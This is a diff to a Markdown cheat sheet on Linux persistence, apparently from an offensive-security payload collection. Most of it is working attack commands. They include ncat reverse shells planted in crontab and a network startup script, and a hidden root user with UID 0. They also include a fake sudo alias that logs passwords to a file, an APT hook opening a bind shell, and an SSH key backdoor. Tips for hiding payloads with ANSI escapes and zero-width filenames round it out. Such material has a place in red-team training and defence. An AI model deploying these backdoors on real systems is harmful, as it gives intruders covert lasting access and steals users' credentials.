@@ -1,11 +1,35 @@
 # Linux - Persistence
 
+## Summary
+
+* [Basic reverse shell](#basic-reverse-shell)
+* [Add a root user](#add-a-root-user)
+* [Suid Binary](#suid-binary)
+* [Crontab - Reverse shell](#crontab-reverse-shell)
+* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
+* [Backdooring a startup service](#backdoor-a-startup-service)
+* [Backdooring a user startup file](#backdooring-an-user-startup-file)
+* [Backdooring a driver](#backdooring-a-driver)
+* [Backdooring the APT](#backdooring-the-apt)
+* [Backdooring the SSH](#backdooring-the-ssh)
+* [Tips](#tips)
+* [References](#references)
+
+
 ## Basic reverse shell
 
 ```bash
 ncat --udp -lvp 4242
 ncat --sctp -lvp 4242
 ncat --tcp -lvp 4242
+```
+
+## Add a root user
+
+```powershell
+sudo useradd -ou 0 -g 0 john
+sudo passwd john
+echo "linuxpassword" | passwd --stdin john
 ```
 
 ## Suid Binary
@@ -19,13 +43,15 @@ chown root:root $TMPDIR2/croissant
 chmod 4777 $TMPDIR2/croissant
 ```
 
-## Crontab (Reverse shell to 192.168.1.2 on port 4242)
+## Crontab - Reverse shell
 
 ```bash
 (crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
 ```
 
-## Backdooring an user's bash_rc (FR/EN Version)
+## Backdooring a user's bash_rc 
+
+(FR/EN Version)
 
 ```bash
 TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
@@ -41,6 +67,26 @@ fi
 rm /tmp/$TMPNAME2
 ```
 
+or add the following line inside its .bashrc file.
+
+```powershell
+$ chmod u+x ~/.hidden/fakesudo
+$ echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc
+```
+
+and create the `fakesudo` script.
+
+```powershell
+read -sp "[sudo] password for $USER: " sudopass
+echo ""
+sleep 2
+echo "Sorry, try again."
+echo $sudopass >> /tmp/pass.txt
+
+/usr/bin/sudo $@
+```
+
+
 ## Backdooring a startup service
 
 ```bash
@@ -48,7 +94,7 @@ RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 ```
 
-## Backdooring an user startup file
+## Backdooring a user startup file
 
 Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`
 
@@ -79,12 +125,26 @@ Next time "apt-get update" is done, your CMD will be executed!
 echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
 ```
 
+## Backdooring the SSH
+
+Add an ssh key into the `~/.ssh` folder.
+
+1. `ssh-keygen`
+2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
+3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys
+
 ## Tips
 
 Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.
 
-```bash
+```powershell
 #[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
+```
+
+Hide in plain sight using zero width spaces in filename.
+
+```powershell
+touch $(echo -n 'index\u200D.php') index.php
 ```
 
 Clear the last line of the history.
